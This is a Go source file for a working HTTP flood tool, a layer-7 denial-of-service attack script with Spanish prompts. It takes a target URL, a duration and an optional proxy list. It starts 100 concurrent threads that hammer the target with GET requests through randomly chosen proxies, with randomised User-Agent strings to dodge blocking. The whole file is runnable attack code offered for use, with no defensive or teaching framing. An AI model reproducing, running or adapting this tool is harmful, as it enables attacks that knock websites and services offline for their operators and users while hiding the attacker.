package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func loadProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxies = append(proxies, line)
		}
	}
	return proxies, scanner.Err()
}

func makeClient(proxyStr string) *http.Client {
	if proxyStr == "" {
		return &http.Client{Timeout: 10 * time.Second}
	}
	proxyURL, err := url.Parse("http://" + proxyStr)
	if err != nil {
		return &http.Client{Timeout: 10 * time.Second}
	}
	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
	}
	return &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}
}

func flood(urlTarget string, duration int, proxies []string, wg *sync.WaitGroup, id int) {
	defer wg.Done()
	end := time.Now().Add(time.Duration(duration) * time.Second)
	r := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))

	for time.Now().Before(end) {
		proxy := ""
		if len(proxies) > 0 {
			proxy = proxies[r.Intn(len(proxies))]
		}
		client := makeClient(proxy)
		req, _ := http.NewRequest("GET", urlTarget, nil)
		req.Header.Set("User-Agent", fmt.Sprintf("Mozilla/5.0 flooder-%d", r.Intn(10000)))
		resp, err := client.Do(req)
		if err == nil && resp != nil {
			resp.Body.Close()
		}
	}
	fmt.Printf("Thread %d done\n", id)
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Uso: ./httpflood <URL> <DURACIÓN_SEGUNDOS> [proxy.txt]")
		return
	}

	urlTarget := os.Args[1]
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil || duration <= 0 {
		fmt.Println("Duración inválida")
		return
	}

	var proxies []string
	if len(os.Args) >= 4 {
		var err error
		proxies, err = loadProxies(os.Args[3])
		if err != nil {
			fmt.Println("Error cargando proxies:", err)
			return
		}
		fmt.Printf("Cargados %d proxies\n", len(proxies))
	}

	threads := 100
	var wg sync.WaitGroup
	wg.Add(threads)

	fmt.Println("Iniciando ataque L7...")
	start := time.Now()
	for i := 0; i < threads; i++ {
		go flood(urlTarget, duration, proxies, &wg, i)
	}
	wg.Wait()
	fmt.Printf("Completado en %v\n", time.Since(start))
}
